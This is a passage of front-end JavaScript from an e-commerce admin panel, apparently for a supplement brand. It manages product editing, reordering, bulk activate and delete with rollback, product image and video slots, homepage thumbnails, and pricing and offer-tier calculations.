    await apiFetch(`/api/admin/products/${id}`, {method:'PUT', body:JSON.stringify(body)});
    // Update local cache
    Object.assign(p, body);
    closeQuickEdit(id);
    filterProducts();
    toast('Product updated ✅');
  } catch(e) { toast(e.message,'error'); }
}

// ── Inline field save (table view) ───────────
async function saveInlineField(id, field, value) {
  const p = allProducts.find(x=>x.id===id); if(!p) return;
  const body = { [field]: value === '' ? null : (field==='stock' ? parseInt(value) : (field==='sale_price' ? (parseFloat(value)||null) : (field==='sort_order' ? (value===null?null:parseInt(value)) : parseFloat(value)))) };
  try {
    await apiFetch(`/api/admin/products/${id}`, {method:'PUT', body:JSON.stringify(body)});
    Object.assign(p, body);
    toast(`${field.replace('_',' ')} updated ✅`);
  } catch(e) { toast(e.message,'error'); }
}

// ── Reorder products (controls where they appear on the shop/homepage) ──
// Swaps sort_order with the neighboring product in the CURRENT sorted/filtered view,
// so "up"/"down" always matches what the admin sees on screen.
async function moveProductPosition(id, direction) {
  const q    = (document.getElementById('productSearch').value||'').toLowerCase();
  const cat  = document.getElementById('productCatFilter').value;
  let list   = allProducts.filter(p => !p.deleted_at);
  if(q) list = list.filter(p => (p.name||'').toLowerCase().includes(q));
  if(cat) list = list.filter(p => p.category === cat);
  list = [...list].sort((a,b)=>(a.sort_order ?? a.position ?? 9999)-(b.sort_order ?? b.position ?? 9999));

  // Normalize missing sort_order values to their current display order first,
  // so swapping always produces a meaningful, persisted change.
  list.forEach((p,i) => { if (p.sort_order == null) p.sort_order = (i+1)*10; });

  const idx = list.findIndex(p => p.id === id);
  if (idx === -1) return;
  const swapIdx = direction === 'up' ? idx - 1 : idx + 1;
  if (swapIdx < 0 || swapIdx >= list.length) return; // already at the edge

  const a = list[idx], b = list[swapIdx];
  const tmp = a.sort_order; a.sort_order = b.sort_order; b.sort_order = tmp;

  try {
    await Promise.all([
      apiFetch(`/api/admin/products/${a.id}`, {method:'PUT', body:JSON.stringify({sort_order:a.sort_order})}),
      apiFetch(`/api/admin/products/${b.id}`, {method:'PUT', body:JSON.stringify({sort_order:b.sort_order})}),
    ]);
    toast('Position updated ✅');
    filterProducts();
  } catch(e) { toast(e.message,'error'); }
}

// ── Bulk selection ─────────────────────────────
function toggleSelectProduct(id, cb) {
  if(cb.checked) selectedProductIds.add(id);
  else selectedProductIds.delete(id);
  updateBulkBar();
}
function toggleSelectAll(cb) {
  const visible = document.querySelectorAll('#productsTbody tr');
  visible.forEach(tr => {
    const rowCb = tr.querySelector('input[type=checkbox]');
    if(rowCb) { rowCb.checked = cb.checked; const idMatch = rowCb.getAttribute('onchange')?.match(/\d+/); if(idMatch) { if(cb.checked) selectedProductIds.add(parseInt(idMatch[0])); else selectedProductIds.delete(parseInt(idMatch[0])); } }
  });
  updateBulkBar();
}
function updateBulkBar() {
  const bar = document.getElementById('bulkBar');
  document.getElementById('bulkCount').textContent = selectedProductIds.size;
  bar.classList.toggle('visible', selectedProductIds.size > 0);
}
function clearBulkSelection() {
  selectedProductIds.clear();
  document.querySelectorAll('#productsTbody input[type=checkbox]').forEach(cb => cb.checked=false);
  const all = document.getElementById('selectAllProds'); if(all) all.checked=false;
  updateBulkBar();
}
// Both of these used to fire ONE REQUEST PER PRODUCT —
//   Promise.all(ids.map(id => apiFetch(`/api/admin/products/${id}`, ...)))
// — so selecting fifty products meant fifty HTTP requests, each landing
// on the single-row handler that does its own SELECT, UPDATE and audit
// INSERT: roughly a hundred and fifty database round trips to set one
// boolean on fifty rows.
//
// Worse than slow, it was not atomic. A failure at request thirty left
// twenty-nine products changed and twenty-one not, and the toast still
// said "50 products deactivated". One request, one statement, one
// transaction — it applies to all of them or to none.
// apiFetch resolves with the Response, and only throws for a non-JSON
// error page — a JSON 400 or 500 comes back as a normal resolved
// response with r.ok false. So both of these check r.ok themselves; a
// bare try/catch would report success for a write the server refused.
async function bulkActivate(active) {
  if(!selectedProductIds.size) return;
  const ids = [...selectedProductIds];
  // Snapshot per product — they will not all have had the same value,
  // so a rollback cannot just set them all back to !active.
  const before = new Map(ids.map(id => {
    const p = allProducts.find(x => x.id === id);
    return [id, p ? p.active : undefined];
  }));

  await optimistic({
    apply: () => {
      ids.forEach(id => { const p = allProducts.find(x=>x.id===id); if(p) p.active = active; });
      clearBulkSelection(); filterProducts();
    },
    commit: async () => {
      const d = await expectOk(apiFetch('/api/admin/products/bulk-update',
        {method:'POST', body:JSON.stringify({ids, patch:{active}})}), 'Bulk update failed');
      toast(`${d.updated ?? ids.length} products ${active?'activated':'deactivated'} ✅`);
      return d;
    },
    rollback: () => {
      ids.forEach(id => {
        const p = allProducts.find(x=>x.id===id);
        if (p && before.get(id) !== undefined) p.active = before.get(id);
      });
      filterProducts();
      // Flash the first affected row — flashing fifty would just look
      // like the page was broken.
      flashRollback(`#productsTbody tr[data-pid="${ids[0]}"]`);
    },
  });
}
async function bulkDelete() {
  if(!selectedProductIds.size || !confirm(`Delete ${selectedProductIds.size} products?`)) return;
  const ids = [...selectedProductIds];
  const before = new Map(ids.map(id => {
    const p = allProducts.find(x => x.id === id);
    return [id, p ? p.deleted_at : undefined];
  }));

  await optimistic({
    apply: () => {
      const stamp = new Date().toISOString();
      ids.forEach(id => { const p = allProducts.find(x=>x.id===id); if(p) p.deleted_at = stamp; });
      clearBulkSelection(); filterProducts();
    },
    commit: async () => {
      const d = await expectOk(apiFetch('/api/admin/products/bulk-delete',
        {method:'POST', body:JSON.stringify({ids})}), 'Bulk delete failed');
      toast(`${d.deleted ?? ids.length} products deleted ✅`);
      loadProducts();   // reconcile with the server's real state
      return d;
    },
    rollback: () => {
      ids.forEach(id => {
        const p = allProducts.find(x=>x.id===id);
        if (p && before.get(id) !== undefined) p.deleted_at = before.get(id);
      });
      filterProducts();
      flashRollback(`#productsTbody tr[data-pid="${ids[0]}"]`);
    },
  });
}

// ── Product Drawer ─────────────────────────────
// Safely turn a backend field that SHOULD be an array (tags, key_ingredients,
// seo_keywords) into a clean comma-separated string for the drawer's text
// inputs — even if the backend actually returned it as a JSON string, or as
// a string that's been double/triple JSON-encoded by a previous bug. This
// prevents the "tags become unreadable escaped garbage" corruption that can
// snowball if a raw JSON string ever gets treated as one big comma-split value.
function arrToCsv(val) {
  let v = val;
  let depth = 0;
  // Keep unwrapping JSON-encoded strings until we get a real array (or give up after 5 tries)
  while (typeof v === 'string' && depth < 5) {
    const trimmed = v.trim();
    if (!trimmed) return '';
    if (trimmed[0] !== '[' && trimmed[0] !== '"') break; // not JSON-looking — treat as plain text below
    try { v = JSON.parse(trimmed); } catch(e) { break; }
    depth++;
  }
  if (Array.isArray(v)) {
    // Flatten in case of nested arrays from historical corruption, then dedupe empties
    const flat = v.flat ? v.flat(Infinity) : v;
    return flat.map(x => String(x).trim()).filter(Boolean).join(', ');
  }
  return typeof v === 'string' ? v : (val || '');
}

function openProductDrawer(productId) {
  drawerProductId = productId;
  const isNew = !productId;
  document.getElementById('drawerTitle').textContent = isNew ? 'New Product' : 'Edit Product';
  document.getElementById('drawerSubtitle').textContent = isNew ? 'Fill in all product details' : 'Update product details below';
  if(!isNew) {
    const p = allProducts.find(x=>x.id===productId);
    if(!p) return;
    document.getElementById('dName').value = p.name||'';
    document.getElementById('dBrand').value = p.brand||'Ozylix';
    document.getElementById('dBadge').value = p.badge||'';
    document.getElementById('dCategory').value = p.category||'effervescent';
    document.getElementById('dActive').value = p.active===false?'false':'true';
    document.getElementById('dDescription').value = p.description||'';
    document.getElementById('dPrice').value = p.price||'';
    document.getElementById('dSalePrice').value = p.sale_price||'';
    if (p.price > 0 && p.sale_price > 0 && p.sale_price < p.price) {
      document.getElementById('dDiscountPct').value = Math.round((1 - p.sale_price/p.price) * 100);
    } else {
      document.getElementById('dDiscountPct').value = '';
    }
    // Load quantity tier discounts, if any
    const tabletsPerPack = parseInt(p.tablets_per_pack) || 15;
    document.getElementById('dTabsPerPack').value = tabletsPerPack;
    document.getElementById('dDosePerDay').value = p.dose_per_day != null ? p.dose_per_day : 1;
    document.getElementById('dPackUnit').value  = p.pack_unit || '';
    drawerTiers = [];
    _tierRowSeq = 0;
    try {
      const t = typeof p.tiers === 'string' ? JSON.parse(p.tiers) : p.tiers;
      if (Array.isArray(t)) {
        t.forEach(row => {
          // New format saves { tabs, discountPct }. Older products saved
          // before this fix may only have { qty, discount } — support both
          // so nothing already in the database breaks.
          const tabs = row.tabs != null ? parseInt(row.tabs) : null;
          const qty = tabs != null ? Math.max(1, Math.round(tabs / tabletsPerPack)) : (parseInt(row.qty || row.units) || 1);
          const mrp = parseFloat(row.mrp || row.price) || (p.price * qty);
          const rate = parseFloat(row.rate || row.sale_price) || mrp;
          const offerType = row.offerType || row.offer_type || (row.buyQuantity != null || row.freeQuantity != null ? 'buy_get' : 'discount');
          const discountType = row.discountType || row.discount_type || 'percent';
          const discount = row.discountPct != null ? parseFloat(row.discountPct)
                          : row.discount != null ? parseFloat(row.discount)
                          : (mrp > 0 ? Math.round((1 - rate/mrp) * 100) : 0);
          drawerTiers.push({
            rid: ++_tierRowSeq, qty, discount, mrp, rate,
            offerType: offerType === 'buy_get' ? 'buy_get' : 'discount',
            buyQuantity: Math.max(1, parseInt(row.buyQuantity ?? row.buy_quantity) || qty),
            freeQuantity: Math.max(0, parseInt(row.freeQuantity ?? row.free_quantity ?? row.getQuantity) || 0),
            discountType: discountType === 'amount' || discountType === 'fixed' ? 'amount' : 'percent',
            discountAmount: parseFloat(row.discountValue ?? row.discount_value) || Math.max(0, mrp - rate),
          });
        });
      }
    } catch {}
    renderTierRows();
    document.getElementById('dOfferText').value = p.offer_text||'';
    document.getElementById('dHsn').value = p.hsn||'30049099';
    document.getElementById('dHsn2').value = p.hsn||'30049099';
    document.getElementById('dStock').value = p.stock||0;
    document.getElementById('dPosition').value = (p.sort_order ?? p.position ?? '');
    document.getElementById('dHowToUse').value = p.how_to_use||'';
    document.getElementById('dIngredients').value = arrToCsv(p.key_ingredients);
    document.getElementById('dTags').value = arrToCsv(p.tags);
    document.getElementById('dImage').value = p.image||'';
    document.getElementById('dImage2').value = p.image2||'';
    document.getElementById('dImage3').value = p.image3||'';
    document.getElementById('dImage4').value = p.image4||'';
    document.getElementById('dImage5').value = p.image5||'';
    document.getElementById('dMetaDesc').value = p.meta_description||'';
    document.getElementById('dSeoKeywords').value = arrToCsv(p.seo_keywords);
    document.getElementById('dSeoSlug').value = p.seo_slug||'';
    document.getElementById('dSeoCanonical').value = p.seo_canonical_url||'';
    document.getElementById('dSeoOgImage').value = p.seo_og_image||'';
    document.getElementById('dSeoTwitterImage').value = p.seo_twitter_image||'';
    document.getElementById('dSeoSchemaType').value = p.seo_schema_type||'Product';
    document.getElementById('dSeoRobots').value = p.seo_robots||'index,follow';
    document.getElementById('dSeoSitemap').checked = p.seo_sitemap_include !== false;
    renderAllImgSlots();
    resetHomeThumbnailPreview();
    loadHomeThumbnail(productId);
    updateDrawerPricePreview();
  } else {
    ['dName','dBadge','dDescription','dOfferText','dHowToUse','dIngredients','dTags','dImage','dImage2','dImage3','dImage4','dImage5','dMetaDesc','dSeoKeywords','dSeoSlug','dSeoCanonical','dSeoOgImage','dSeoTwitterImage','dHomeThumbnail'].forEach(id => document.getElementById(id).value='');
    document.getElementById('dSeoSchemaType').value = 'Product';
    document.getElementById('dSeoRobots').value = 'index,follow';
    document.getElementById('dSeoSitemap').checked = true;
    document.getElementById('dBrand').value='Ozylix';
    document.getElementById('dHsn').value='30049099';
    document.getElementById('dHsn2').value='30049099';
    document.getElementById('dStock').value='0';
    document.getElementById('dPosition').value='';
    renderAllImgSlots();
    document.getElementById('dActive').value='true';
    document.getElementById('dTabsPerPack').value='15';
    document.getElementById('dDosePerDay').value='1';
    document.getElementById('dPackUnit').value='';
    document.getElementById('dPrice').value='';
    document.getElementById('dSalePrice').value='';
    document.getElementById('dDiscountPct').value='';
    drawerTiers = [];
    _tierRowSeq = 0;
    renderTierRows();
    document.getElementById('drawerPricePreview').style.display='none';
    resetHomeThumbnailPreview();
  }
  document.getElementById('prodDrawer').classList.add('open');
  document.getElementById('prodDrawerOverlay').classList.add('open');
}
function closeProductDrawer() {
  document.getElementById('prodDrawer').classList.remove('open');
  document.getElementById('prodDrawerOverlay').classList.remove('open');
}

let drawerHomeThumbnailUrl = '';
let drawerHomeThumbnailPendingUrl = '';
function renderHomeThumbnailPreview(url) {
  const box = document.getElementById('homeThumbPreview');
  if (!box) return;
  const src = adminCdnImg(url || '');
  box.innerHTML = url
    ? (isVideoFileUrl(src)
      ? `<video src="${src}" muted loop playsinline autoplay preload="metadata" aria-label="Homepage thumbnail video" style="width:100%;height:100%;object-fit:cover;"></video><span class="img-slot-vid-badge">VIDEO</span>`
      : `<img src="${src}" alt="Homepage thumbnail" style="width:100%;height:100%;object-fit:cover;" onerror="this.parentElement.textContent='Thumbnail unavailable'">`)
    : 'No thumbnail';
}
function resetHomeThumbnailPreview(url = '') {
  drawerHomeThumbnailUrl = String(url || '');
  drawerHomeThumbnailPendingUrl = '';
  const field = document.getElementById('dHomeThumbnail');
  if (field) field.value = drawerHomeThumbnailUrl;
  renderHomeThumbnailPreview(drawerHomeThumbnailUrl);
  const clear = document.getElementById('clearHomeThumbBtn');
  const save = document.getElementById('saveHomeThumbBtn');
  if (clear) clear.style.display = drawerHomeThumbnailUrl ? '' : 'none';
  if (save) save.style.display = 'none';
  const status = document.getElementById('homeThumbSaveStatus');
  if (status) status.textContent = drawerHomeThumbnailUrl ? 'Saved homepage thumbnail' : 'No homepage thumbnail saved';
  if (document.getElementById('homeThumbSelector')?.style.display !== 'none') renderHomeThumbnailGallery();
}
function setPendingHomeThumbnailPreview(url) {
  drawerHomeThumbnailPendingUrl = String(url || '');
  if (!drawerHomeThumbnailPendingUrl) return;
  const field = document.getElementById('dHomeThumbnail');
  if (field) field.value = drawerHomeThumbnailPendingUrl;
  renderHomeThumbnailPreview(drawerHomeThumbnailPendingUrl);
  const save = document.getElementById('saveHomeThumbBtn');
  const status = document.getElementById('homeThumbSaveStatus');
  if (save) save.style.display = '';
  if (status) status.textContent = 'Unsaved gallery selection — click Save Homepage Media';
  renderHomeThumbnailGallery();
}
async function loadHomeThumbnail(productId) {
  if (!productId) return;
  try {
    const r = await apiFetch(`/api/admin/products/${productId}/home-thumbnail`);
    const d = await r.json();
    if (r.ok && drawerProductId === productId) resetHomeThumbnailPreview(d.data?.url || '');
  } catch (e) { console.warn('[admin] homepage thumbnail load failed:', e.message); }
}
function triggerHomeThumbnailUpload() {
  if (!drawerProductId) { toast('Save the product first, then upload its homepage thumbnail.', 'error'); return; }
  const input = document.getElementById('homeThumbFileInput');
  if (input) { input.value = ''; input.click(); }
}
function openHomeThumbnailGallery() {
  toggleHomeThumbnailSelector(true);
}
let homeThumbGalleryItems = [];
let homeThumbGalleryQuery = '';
async function toggleHomeThumbnailSelector(force) {
  if (!drawerProductId) { toast('Save the product first, then choose a gallery image.', 'error'); return; }
  const panel = document.getElementById('homeThumbSelector');
  if (!panel) return;
  const open = force === undefined ? panel.style.display === 'none' : !!force;
  panel.style.display = open ? '' : 'none';
  if (!open) return;
  const search = document.getElementById('homeThumbGallerySearch');
  if (search) { search.value = ''; homeThumbGalleryQuery = ''; }
  await loadHomeThumbnailGallery();
}
async function loadHomeThumbnailGallery() {
  const status = document.getElementById('homeThumbGalleryStatus');
  const grid = document.getElementById('homeThumbGalleryGrid');
  if (!grid) return;
  if (status) status.textContent = 'Loading gallery…';
  try {
    const r = await apiFetch('/api/upload/library');
    const d = await r.json().catch(() => ({}));
    if (!r.ok) throw new Error(d.error || ('HTTP ' + r.status));
    const imgs = d.data || d.images || d.files || d.photos || (Array.isArray(d) ? d : []);
    homeThumbGalleryItems = imgs.filter(img => img && img.url);
    renderHomeThumbnailGallery();
  } catch (e) {
    homeThumbGalleryItems = [];
    if (status) status.textContent = 'Could not load gallery: ' + e.message;
    grid.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:16px;color:var(--danger);font-size:.72rem;">Gallery unavailable</div>';
  }
}
function filterHomeThumbnailGallery(value) {
  homeThumbGalleryQuery = String(value || '').trim().toLowerCase();
  renderHomeThumbnailGallery();
}
function renderHomeThumbnailGallery() {
  const grid = document.getElementById('homeThumbGalleryGrid');
  const status = document.getElementById('homeThumbGalleryStatus');
  if (!grid) return;
  const list = homeThumbGalleryItems.filter(img => !homeThumbGalleryQuery || String(img.filename || img.original_name || '').toLowerCase().includes(homeThumbGalleryQuery));
  const selected = drawerHomeThumbnailPendingUrl || drawerHomeThumbnailUrl;
  if (status) status.textContent = list.length + ' media file' + (list.length === 1 ? '' : 's') + (selected ? ' · tap a file to preview' : '');
  grid.innerHTML = list.length ? list.map((img, index) => {
    const name = String(img.original_name || img.filename || 'Gallery image');
    const isSelected = String(img.url) === String(selected);
    return `<button type="button" class="home-thumb-gallery-item" data-gallery-index="${index}" style="border:2px solid ${isSelected ? 'var(--brand)' : 'var(--edge)'};background:var(--bg);border-radius:9px;padding:4px;min-width:0;text-align:left;cursor:pointer;">
      ${isVideoFileUrl(img.url) ? `<video src="${adminCdnImg(img.url)}" muted loop playsinline autoplay preload="metadata" aria-label="${esc(name)}" style="width:100%;aspect-ratio:1;object-fit:cover;border-radius:6px;display:block;"></video>` : `<img src="${adminCdnImg(img.url)}" alt="${esc(name)}" loading="lazy" style="width:100%;aspect-ratio:1;object-fit:cover;border-radius:6px;display:block;">`}
      <span style="display:block;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-size:.62rem;color:var(--text2);padding:4px 2px 1px;">${esc(name.replace(/\.[^.]+$/, ''))}</span>
    </button>`;
  }).join('') : '<div style="grid-column:1/-1;text-align:center;padding:16px;color:var(--text3);font-size:.72rem;">No gallery images match</div>';
  grid.querySelectorAll('[data-gallery-index]').forEach((button, index) => {
    button.addEventListener('click', () => {
      const image = list[index];
      if (!image) return;
      setPendingHomeThumbnailPreview(image.url);
      renderHomeThumbnailGallery();
      toast((isVideoFileUrl(image.url) ? 'Video' : 'Image') + ' selected — click Save Homepage Media');
    });
  });
}
async function saveHomeThumbnail() {
  if (!drawerProductId || !drawerHomeThumbnailPendingUrl) { toast('Choose an image or video from the gallery first.', 'error'); return; }
  try {
    const r = await apiFetch(`/api/admin/products/${drawerProductId}/home-thumbnail`, { method: 'PUT', body: JSON.stringify({ url: drawerHomeThumbnailPendingUrl }) });
    const d = await r.json().catch(() => ({}));
    if (!r.ok) throw new Error(d.error || 'Could not save homepage thumbnail');
    resetHomeThumbnailPreview(d.data?.url || drawerHomeThumbnailPendingUrl);
    toast('Homepage media saved ✅');
  } catch (e) { toast(e.message, 'error'); }
}
async function handleHomeThumbnailFileChosen(input) {
  const file = input?.files?.[0];
  if (!file || !drawerProductId) return;
  const fd = new FormData();
  fd.append('image', file);
  try {
    toast(file.type.startsWith('video/') ? 'Uploading homepage thumbnail video…' : 'Uploading homepage thumbnail image…');
    const r = await adminProofUpload(`/api/admin/products/${drawerProductId}/home-thumbnail`, fd, 'Authorize this homepage thumbnail upload?');
    const d = await r.json().catch(() => ({}));
    if (!r.ok) throw new Error(d.error || 'Thumbnail upload failed');
    resetHomeThumbnailPreview(d.data?.url || '');
    toast((file.type.startsWith('video/') ? 'Homepage thumbnail video' : 'Homepage thumbnail image') + ' uploaded ✅');
  } catch (e) { toast(e.message, 'error'); }
}
async function clearHomeThumbnail() {
  if (drawerHomeThumbnailPendingUrl) {
    resetHomeThumbnailPreview(drawerHomeThumbnailUrl);
    toast('Pending media selection discarded');
    return;
  }
  if (!drawerProductId || !drawerHomeThumbnailUrl) return;
  if (!confirm('Remove this homepage media? Shop/product images will not be changed.')) return;
  try {
    const r = await apiFetch(`/api/admin/products/${drawerProductId}/home-thumbnail`, {method:'DELETE'});
    const d = await r.json().catch(() => ({}));
    if (!r.ok) throw new Error(d.error || 'Thumbnail removal failed');
    resetHomeThumbnailPreview('');
    toast('Homepage thumbnail removed');
  } catch (e) { toast(e.message, 'error'); }
}
const IMG_SLOT_FIELDS = {1:'dImage', 2:'dImage2', 3:'dImage3', 4:'dImage4', 5:'dImage5'};

// Render every slot from its hidden field's current value (call after loading/clearing a product)
function renderAllImgSlots() {
  for (let s = 1; s <= 5; s++) renderImgSlot(s);
}

// Admin previews use the saved public storage URL directly. The storefront's
// edge cache is independent and must not gate media management.
function adminCdnImg(url) {
  if (!url) return url;
  const s = String(url).trim();
  // Older saved values may already contain the same-origin proxy prefix.
  if (s.startsWith('/cdn-storage/product-images/')) {
    return 'https://frwsjgrrtzhjfflcdjjs.supabase.co/storage/v1/object/public/' + s.slice('/cdn-storage/'.length);
  }
  return s;
}

// Video detection — a product slot can now hold a video (mp4/webm/mov).
// Checked by filename extension (works for both Supabase and CDN URLs)
// and by the ?response-content-type param that Supabase appends.
function isVideoFile(nameOrUrl) {
  const s = String(nameOrUrl || '').toLowerCase().split('?')[0];
  return /\.(mp4|webm|mov|m4v|3gp)(\?|$)/.test(s);
}
function isVideoFileUrl(url) {
  if (!url) return false;
  const s = String(url).toLowerCase();
  if (/response-content-type=video/.test(s)) return true;
  return isVideoFile(s);
}

function renderImgSlot(slot) {
  const url = adminCdnImg(document.getElementById(IMG_SLOT_FIELDS[slot]).value || '');
  const isVideoUrl = isVideoFileUrl(url);
  const box = document.getElementById('imgSlot' + slot);
  const img = document.getElementById('imgSlotPreview' + slot);
  const plus = document.getElementById('imgSlotPlus' + slot);
  // clear any old delete button / badge / spinner / video elements before redrawing
  box.querySelectorAll('.img-slot-del,.img-slot-main-badge,.img-slot-spinner,.img-slot-vid-badge,video').forEach(el => el.remove());
  if (url) {
    plus.style.display = 'none';
    box.classList.add('filled');
    if (isVideoUrl) {
      img.style.display = 'none'; img.src = '';
      const vid = document.createElement('video');
      vid.className = 'img-slot-preview-video';
      vid.src = url; vid.muted = true; vid.loop = true; vid.playsInline = true;
      vid.autoplay = true;
      box.appendChild(vid);
      const vb = document.createElement('span');
      vb.className = 'img-slot-vid-badge'; vb.textContent = 'VIDEO';
      box.appendChild(vb);
    } else {
      img.src = url; img.style.display = 'block';
    }
    if (slot === 1) {
      const badge = document.createElement('span');
      badge.className = 'img-slot-main-badge'; badge.textContent = 'MAIN';
      box.appendChild(badge);
    }
    const del = document.createElement('button');
    del.type = 'button'; del.className = 'img-slot-del'; del.title = 'Delete this image everywhere'; del.textContent = '✕';
    del.onclick = (e) => { e.stopPropagation(); deleteProductImageSlot(slot); };
    box.appendChild(del);
  } else {
    img.style.display = 'none'; img.src=''; plus.style.display = 'block';
    box.classList.remove('filled');
  }
}

// Reuse an already-uploaded Photo Library image in the product drawer — no re-upload needed
function addLibraryImageToOpenProduct(url) {
  const emptySlot = [1,2,3,4,5].find(s => !document.getElementById(IMG_SLOT_FIELDS[s]).value);
  if (!emptySlot) { toast('Open a product first (or all 5 image slots are full)', 'error'); return; }
  document.getElementById(IMG_SLOT_FIELDS[emptySlot]).value = url;
  renderImgSlot(emptySlot);
  showPage('products');
  toast('✅ Image added to the open product — remember to Save');
}

function triggerImgSlotUpload(slot) {
  const inp = document.getElementById('imgSlotFileInput');
  inp._targetSlot = slot;
  inp.value = '';
  inp.click();
}

async function handleImgSlotFileChosen(input) {
  const slot = input._targetSlot;
  const file = input.files[0];
  if (!file || !slot) return;
  const box = document.getElementById('imgSlot' + slot);
  const spinner = document.createElement('div');
  spinner.className = 'img-slot-spinner'; spinner.textContent = '⏳';
  box.appendChild(spinner);
  // Large videos are re-encoded on the server (H.264/MP4) — on Render's
  // free tier that can take tens of seconds; warn BEFORE uploading so a
  // long wait never looks like a broken upload.
  if (file.type.startsWith('video/')) {
    const mb = file.size / (1024 * 1024);
    if (mb > 50) {
      spinner.remove();
      toast('❌ Video is ' + mb.toFixed(0) + ' MB — too large. Keep videos under 50 MB (compress on your phone first).', 'error');
      return;
    }
    toast('⏳ Uploading video — the server is compressing it to web size, this can take up to a minute…');
  }
  const fd = new FormData(); fd.append('image', file);
  try {
    const r = await adminProofUpload('/api/upload/image', fd, 'Authorize this product image upload?');
    const d = await r.json();
    if (!r.ok) {
      const msg = (d.error||'').toLowerCase();
      if (msg.includes('bucket') || msg.includes('storage') || msg.includes('not found')) {
        toast('❌ Storage bucket not found. Go to Supabase → Storage → Create bucket named "product-images" (public).', 'error');
      } else {
        throw new Error(d.error || 'Upload failed');
      }
      return;
    }
    document.getElementById(IMG_SLOT_FIELDS[slot]).value = d.url || d.public_url || '';
    toast('✅ ' + (isVideoFile(file.name) ? 'Video' : 'Image') + ' uploaded — compressed & optimised');
  } catch(e) {
    toast('Upload error: ' + e.message, 'error');
  } finally {
    spinner.remove();
    renderImgSlot(slot);
  }
}

async function deleteProductImageSlot(slot) {
  const field = document.getElementById(IMG_SLOT_FIELDS[slot]);
  const url = field.value;
  if (!url) return;
  if (!confirm('Delete this image from storage and remove it from every product/site slot using it? This can\'t be undone.')) return;
  try {
    const filename = url.split('/').pop().split('?')[0];
    const r = await apiFetch(`/api/upload/image/${encodeURIComponent(filename)}`, {method:'DELETE'});
    const d = await r.json().catch(()=>({}));
    field.value = '';
    renderImgSlot(slot);
    const cleared = d.clearedReferences;
    toast(cleared ? `🗑️ Image deleted — cleared from ${cleared} place(s)` : '🗑️ Image deleted');
  } catch(e) {
    toast('Delete failed: ' + e.message, 'error');
  }
}
function updateDrawerPricePreview() {
  const mrp  = parseFloat(document.getElementById('dPrice').value);
  const sale = parseFloat(document.getElementById('dSalePrice').value);
  const box  = document.getElementById('drawerPricePreview');
  if(mrp > 0) {
    box.style.display='flex';
    if(sale > 0 && sale < mrp) {
      const disc = Math.round((1-sale/mrp)*100);
      document.getElementById('dpSale').textContent = '₹'+sale;
      document.getElementById('dpMrp').textContent  = '₹'+mrp;
      document.getElementById('dpDisc').textContent  = disc+'% off';
      document.getElementById('dpDisc').style.display='block';
    } else {
      document.getElementById('dpSale').textContent = '₹'+mrp;
      document.getElementById('dpMrp').textContent  = '';
      document.getElementById('dpDisc').style.display='none';
    }
  } else {
    box.style.display='none';
  }
}

// ── Flat % Discount ⇄ Sale Price ⇄ MRP — bidirectional auto-calculation ──
// Editing MRP: keep whichever of Sale Price / Discount % was last touched in sync.
function syncFromMrp() {
  const mrp  = parseFloat(document.getElementById('dPrice').value) || 0;
  const pctEl = document.getElementById('dDiscountPct');
  const pct  = parseFloat(pctEl.value);
  if (mrp > 0 && pct > 0) {
    document.getElementById('dSalePrice').value = Math.round(mrp * (1 - pct/100));
  }
  updateDrawerPricePreview();
  recalcAllTierRows();
}
// Editing Sale Price directly: back-calculate the Discount % field.
function syncFromSalePrice() {
  const mrp  = parseFloat(document.getElementById('dPrice').value) || 0;
  const sale = parseFloat(document.getElementById('dSalePrice').value);
  const pctEl = document.getElementById('dDiscountPct');
  if (mrp > 0 && sale > 0 && sale < mrp) {
    pctEl.value = Math.round((1 - sale/mrp) * 100);
  } else if (!sale) {
    pctEl.value = '';
  }
  updateDrawerPricePreview();
}
// Editing Discount %: forward-calculate the Sale Price field.
function syncFromDiscountPct() {
  const mrp = parseFloat(document.getElementById('dPrice').value) || 0;
  let pct   = parseFloat(document.getElementById('dDiscountPct').value);
  if (pct > 99) { pct = 99; document.getElementById('dDiscountPct').value = 99; }
  if (pct < 0)  { pct = 0;  document.getElementById('dDiscountPct').value = 0; }
  if (mrp > 0 && pct > 0) {
    document.getElementById('dSalePrice').value = Math.round(mrp * (1 - pct/100));
  } else if (!pct && pct !== 0) {
    // cleared — leave sale price as-is
  }
  updateDrawerPricePreview();
}

// ── Mixed offer-tier editor ───────────────────────────────────
// Four rows maximum. Each row is either a Buy X/Get Y offer or a
// percentage/fixed discount. Calculated fields are preview-only; the backend
// validates and recalculates them before persistence and checkout.
let drawerTiers = [];
let _tierRowSeq = 0;
const MAX_DRAWER_TIERS = 4;

function tierBaseValues(t) {
  const unit = parseFloat(document.getElementById('dPrice').value) || 0;
  const tabsPerPack = Math.max(1, parseInt(document.getElementById('dTabsPerPack')?.value) || 15);
  const type = t.offerType === 'buy_get' ? 'buy_get' : 'discount';
  if (type === 'buy_get') {
    t.buyQuantity = Math.max(1, parseInt(t.buyQuantity) || 1);
    t.freeQuantity = Math.max(0, parseInt(t.freeQuantity) || 0);
    t.qty = t.buyQuantity + t.freeQuantity;
    t.mrp = unit * t.qty;
    t.rate = unit * t.buyQuantity;
    t.discount = t.mrp > 0 ? (1 - t.rate / t.mrp) * 100 : 0;
  } else {
    t.qty = Math.max(1, parseInt(t.qty) || 1);
    t.mrp = unit * t.qty;
    t.discountType = t.discountType === 'amount' ? 'amount' : 'percent';
    t.discount = Math.max(0, Math.min(99, parseFloat(t.discount) || 0));
    if (t.discountType === 'amount') {
      t.discountAmount = Math.min(t.mrp, Math.max(0, parseFloat(t.discountAmount) || 0));
      t.rate = Math.max(0, t.mrp - t.discountAmount);
      t.discount = t.mrp > 0 ? (t.discountAmount / t.mrp) * 100 : 0;
    } else {
      t.rate = Math.max(0, t.mrp * (1 - t.discount / 100));
      t.discountAmount = t.mrp - t.rate;
    }
    t.buyQuantity = t.qty;
    t.freeQuantity = 0;
  }
  t.tabs = t.qty * tabsPerPack;
  return t;
}
function addTierRow(prefill) {
  if (drawerTiers.length >= MAX_DRAWER_TIERS) { toast('Maximum 4 offer tiers per product', 'error'); return; }
  const nextQty = prefill?.qty || (drawerTiers.length ? Math.max(...drawerTiers.map(t=>t.qty||0)) + 1 : 1);
  drawerTiers.push(tierBaseValues({
    rid: ++_tierRowSeq,
    offerType: prefill?.offerType || 'discount',
    qty: prefill?.qty ?? nextQty,
    buyQuantity: prefill?.buyQuantity ?? 1,
    freeQuantity: prefill?.freeQuantity ?? 0,
    discountType: prefill?.discountType || 'percent',
    discount: prefill?.discount ?? prefill?.discountPct ?? 0,
